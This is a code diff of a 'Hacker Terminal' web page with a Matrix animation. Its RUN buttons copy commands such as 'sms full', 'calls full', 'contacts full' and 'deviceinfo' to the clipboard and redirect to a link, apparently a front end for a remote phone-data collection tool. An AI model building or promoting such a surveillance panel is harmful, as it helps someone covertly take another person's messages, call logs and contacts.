@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HACKER TERMINAL v3.0</title>
+<title>HACKER TERMINAL - Advanced Command Control Panel</title>
 
 <link href="https://fonts.googleapis.com/css2?family=VT323&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
 
@@ -23,8 +23,7 @@ body{
     min-height:100vh;
 }
 
-/* ================= MATRIX BACKGROUND ================= */
-
+/* MATRIX CANVAS */
 canvas{
     position:fixed;
     top:0;
@@ -33,40 +32,25 @@ canvas{
     pointer-events:none;
 }
 
-/* ================= BOOT SCREEN ================= */
-
-#bootScreen{
+/* SCANLINES */
+.scanlines{
     position:fixed;
-    inset:0;
-    background:#0d1117;
-    color:#00ff41;
-    font-family:monospace;
-    z-index:9999;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    transition:opacity 1s ease;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    pointer-events:none;
+    z-index:5;
+    background:repeating-linear-gradient(
+        to bottom,
+        transparent 0px,
+        transparent 2px,
+        rgba(0,255,0,0.03) 2px,
+        rgba(0,255,0,0.03) 4px
+    );
 }
 
-.boot-terminal{
-    width:90%;
-    max-width:1000px;
-    height:90vh;
-    background:#000;
-    border-radius:6px;
-    box-shadow:0 0 30px #00ff41;
-    padding:20px;
-    overflow-y:auto;
-    font-size:14px;
-    line-height:1.6;
-}
-
-#bootText{
-    white-space:pre-wrap;
-}
-
-/* ================= MAIN TERMINAL ================= */
-
+/* TERMINAL */
 .terminal{
     position:relative;
     z-index:10;
@@ -78,12 +62,9 @@ canvas{
     margin:20px auto;
     padding:20px;
     border-radius:10px;
-    min-height:90vh;
-    display:none;
 }
 
-/* Header */
-
+/* HEADER */
 .header{
     display:flex;
     align-items:center;
@@ -91,6 +72,12 @@ canvas{
     margin-bottom:30px;
     padding-bottom:15px;
     border-bottom:1px solid #00ff00;
+}
+
+.left-header{
+    display:flex;
+    align-items:center;
+    gap:15px;
 }
 
 .window-buttons{
@@ -110,31 +97,45 @@ canvas{
 
 h1{
     font-family:'VT323', monospace;
-    font-size:2.2em;
+    font-size:2.5em;
     text-shadow:0 0 10px #00ff00;
 }
 
-.contact-btn{
-    padding:6px 14px;
+/* BUTTONS */
+button{
+    padding:8px 16px;
     border:1px solid #00ff00;
     background:transparent;
     color:#00ff00;
     cursor:pointer;
-    text-transform:uppercase;
+    font-family:'Courier Prime', monospace;
+    transition:0.3s;
+    font-size:0.9em;
 }
 
-/* Sections */
+button:hover{
+    background:rgba(0,255,0,0.15);
+    box-shadow:0 0 10px #00ff00;
+    color:#fff;
+}
 
+.contact-btn{
+    font-size:0.8em;
+}
+
+/* SECTIONS */
 .section{
     margin-bottom:30px;
 }
 
 .section h2{
     font-family:'VT323', monospace;
-    font-size:1.6em;
+    font-size:1.8em;
     margin-bottom:15px;
+    color:#00ff41;
 }
 
+/* CARD */
 .card{
     background:rgba(0,20,0,0.5);
     padding:15px 20px;
@@ -150,6 +151,7 @@ h1{
 .card:hover{
     border-color:#00ff00;
     box-shadow:0 0 15px rgba(0,255,0,0.5);
+    transform:scale(1.02);
 }
 
 .command{
@@ -157,186 +159,113 @@ h1{
     color:#00ff88;
 }
 
-/* RUN Button */
-
-button{
-    padding:8px 16px;
-    border:1px solid #00ff00;
-    border-radius:3px;
-    background:transparent;
-    color:#00ff00;
-    cursor:pointer;
-    text-transform:uppercase;
-    transition:0.3s;
-}
-
-button:hover{
-    background:rgba(0,255,0,0.1);
-    box-shadow:0 0 10px #00ff00;
-}
-
-/* Footer */
-
 .footer{
     text-align:center;
     margin-top:30px;
-    font-size:0.9em;
     color:#00aa00;
+    font-size:0.9em;
 }
 
-/* Responsive */
-
+/* RESPONSIVE */
 @media(max-width:768px){
-    .terminal{
-        margin:10px;
-        padding:15px;
-    }
+    h1{font-size:2em;}
+    .terminal{margin:10px;padding:15px;}
 }
 </style>
 </head>
-
 <body>
 
-<!-- MATRIX -->
 <canvas id="matrix"></canvas>
+<div class="scanlines"></div>
 
-<!-- BOOT SCREEN -->
-<div id="bootScreen">
-    <div class="boot-terminal">
-        <pre id="bootText"></pre>
-    </div>
-</div>
-
-<!-- MAIN TERMINAL -->
 <div class="terminal">
 
-    <div class="header">
+<div class="header">
+    <div class="left-header">
         <div class="window-buttons">
             <div class="window-btn red"></div>
             <div class="window-btn yellow"></div>
             <div class="window-btn green"></div>
         </div>
-        <h1>HACKER TERMINAL v3.0</h1>
-        <button class="contact-btn"
-        onclick="window.location.href='https://rahulpuri.fun/RKP-ControlPanel/Tracking'">
-        Tracking 
-        </button>
+        <h1>HACKER TERMINAL v2.0</h1>
     </div>
 
-    <!-- SMS -->
-    <div class="section">
-        <h2>SMS Commands</h2>
-        <div class="card"><span class="command">sms full</span><button onclick="runCommand('sms full')">RUN</button></div>
-        <div class="card"><span class="command">sms 30d</span><button onclick="runCommand('sms 30d')">RUN</button></div>
-        <div class="card"><span class="command">sms 7d</span><button onclick="runCommand('sms 7d')">RUN</button></div>
-        <div class="card"><span class="command">sms 1d</span><button onclick="runCommand('sms 1d')">RUN</button></div>
-    </div>
+    <button class="contact-btn"
+        onclick="window.location.href='https://yourcontactlink.com'">
+        CONTACT OWNER
+    </button>
+</div>
 
-    <!-- CALLS -->
-    <div class="section">
-        <h2>Call Commands</h2>
-        <div class="card"><span class="command">calls full</span><button onclick="runCommand('calls full')">RUN</button></div>
-        <div class="card"><span class="command">calls 30d</span><button onclick="runCommand('calls 30d')">RUN</button></div>
-        <div class="card"><span class="command">calls 7d</span><button onclick="runCommand('calls 7d')">RUN</button></div>
-        <div class="card"><span class="command">calls 1d</span><button onclick="runCommand('calls 1d')">RUN</button></div>
-    </div>
+<!-- COMMAND SECTIONS -->
 
-    <!-- DEVICE -->
-    <div class="section">
-        <h2>Device</h2>
-        <div class="card"><span class="command">deviceinfo</span><button onclick="runCommand('deviceinfo')">RUN</button></div>
-        <div class="card"><span class="command">connection</span><button onclick="runCommand('connection')">RUN</button></div>
-    </div>
+<div class="section">
+<h2>SMS Commands</h2>
+<div class="card"><span class="command">sms full</span><button onclick="runCommand('sms full')">RUN</button></div>
+<div class="card"><span class="command">sms 30d</span><button onclick="runCommand('sms 30d')">RUN</button></div>
+<div class="card"><span class="command">sms 7d</span><button onclick="runCommand('sms 7d')">RUN</button></div>
+<div class="card"><span class="command">sms 1d</span><button onclick="runCommand('sms 1d')">RUN</button></div>
+</div>
 
-    <div class="footer">
-        [REMOTE COMMAND SYSTEM] — ACCESS GRANTED — TERMINAL ONLINE —
-    </div>
+<div class="section">
+<h2>Call Commands</h2>
+<div class="card"><span class="command">calls full</span><button onclick="runCommand('calls full')">RUN</button></div>
+<div class="card"><span class="command">calls 30d</span><button onclick="runCommand('calls 30d')">RUN</button></div>
+<div class="card"><span class="command">calls 7d</span><button onclick="runCommand('calls 7d')">RUN</button></div>
+<div class="card"><span class="command">calls 1d</span><button onclick="runCommand('calls 1d')">RUN</button></div>
+</div>
+
+<div class="section">
+<h2>Contacts</h2>
+<div class="card"><span class="command">contacts full</span><button onclick="runCommand('contacts full')">RUN</button></div>
+</div>
+
+<div class="section">
+<h2>Apps</h2>
+<div class="card"><span class="command">apps full</span><button onclick="runCommand('apps full')">RUN</button></div>
+</div>
+
+<div class="section">
+<h2>Device</h2>
+<div class="card"><span class="command">deviceinfo</span><button onclick="runCommand('deviceinfo')">RUN</button></div>
+<div class="card"><span class="command">connection</span><button onclick="runCommand('connection')">RUN</button></div>
+</div>
+
+<div class="section">
+<h2>Control</h2>
+<div class="card"><span class="command">none</span><button onclick="runCommand('none')">RUN</button></div>
+</div>
+
+<div class="footer">
+[REMOTE COMMAND SYSTEM] — ACCESS GRANTED — TERMINAL ONLINE —
+</div>
 
 </div>
 
 <script>
-
-/* ================= BOOT SEQUENCE ================= */
-
-const bootMessages = [
-"┌──(root㉿kali)-[~]",
-"└─# Initializing Advanced Remote Access System...",
-"",
-"[✔] Loading kernel modules...",
-"[✔] Establishing encrypted channel...",
-"[✔] Injecting payload modules...",
-"[✔] Bypassing firewall...",
-"",
-"root@kali:~# nmap -A target.local",
-"22/tcp open ssh",
-"80/tcp open http",
-"443/tcp open https",
-"",
-"ACCESS GRANTED.",
-"Launching Remote Command Interface..."
-];
-
-const bootText = document.getElementById("bootText");
-const bootScreen = document.getElementById("bootScreen");
-const mainTerminal = document.querySelector(".terminal");
-
-let line = 0;
-let char = 0;
-
-function typeBoot(){
-    if(line < bootMessages.length){
-        if(char < bootMessages[line].length){
-            bootText.textContent += bootMessages[line][char];
-            char++;
-            setTimeout(typeBoot, 20);
-        }else{
-            bootText.textContent += "\n";
-            line++;
-            char=0;
-            setTimeout(typeBoot,120);
-        }
-    }else{
-        setTimeout(()=>{
-            bootScreen.style.opacity="0";
-            setTimeout(()=>{
-                bootScreen.style.display="none";
-                mainTerminal.style.display="block";
-            },1000);
-        },1000);
-    }
-}
-
-window.onload = typeBoot;
-
-/* ================= MATRIX EFFECT ================= */
-
-const canvas = document.getElementById('matrix');
-const ctx = canvas.getContext('2d');
-
-let fontSize = 14;
+/* MATRIX EFFECT */
+const canvas=document.getElementById('matrix');
+const ctx=canvas.getContext('2d');
+let fontSize=14;
 let columns;
 let drops;
+const chars="01アイウエオカキクケコサシスセソタチツテトナニヌネノ";
 
 function initMatrix(){
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    columns = Math.floor(canvas.width / fontSize);
-    drops = Array(columns).fill(1);
+    canvas.width=window.innerWidth;
+    canvas.height=window.innerHeight;
+    columns=Math.floor(canvas.width/fontSize);
+    drops=Array(columns).fill(1);
 }
 
-const chars = "01アイウエオカキクケコサシスセソタチツテト";
-
-function drawMatrix(){
-    ctx.fillStyle="rgba(0,0,0,0.05)";
+function draw(){
+    ctx.fillStyle='rgba(0,0,0,0.05)';
     ctx.fillRect(0,0,canvas.width,canvas.height);
-
-    ctx.fillStyle="#00ff00";
+    ctx.fillStyle='#00ff00';
     ctx.font=fontSize+"px monospace";
-
     for(let i=0;i<drops.length;i++){
-        const text = chars[Math.floor(Math.random()*chars.length)];
+        const text=chars[Math.floor(Math.random()*chars.length)];
         ctx.fillText(text,i*fontSize,drops[i]*fontSize);
-        if(drops[i]*fontSize > canvas.height && Math.random()>0.975){
+        if(drops[i]*fontSize>canvas.height && Math.random()>0.975){
             drops[i]=0;
         }
         drops[i]++;
@@ -344,19 +273,22 @@ function drawMatrix(){
 }
 
 initMatrix();
-setInterval(drawMatrix,50);
+setInterval(draw,50);
+
 window.addEventListener('resize',initMatrix);
 
-/* ================= RUN BUTTON ================= */
-
+/* RUN FUNCTION */
 function runCommand(cmd){
-    navigator.clipboard.writeText(cmd).then(()=>{
-        window.location.href="https://your-redirect-link.com";
-    }).catch(()=>{
-        window.location.href="https://your-redirect-link.com";
-    });
-}
+    const redirectURL="https://yourredirectlink.com"; 
 
+    if(navigator.clipboard){
+        navigator.clipboard.writeText(cmd)
+        .then(()=>{ window.location.href=redirectURL; })
+        .catch(()=>{ window.location.href=redirectURL; });
+    }else{
+        window.location.href=redirectURL;
+    }
+}
 </script>
 
 </body>
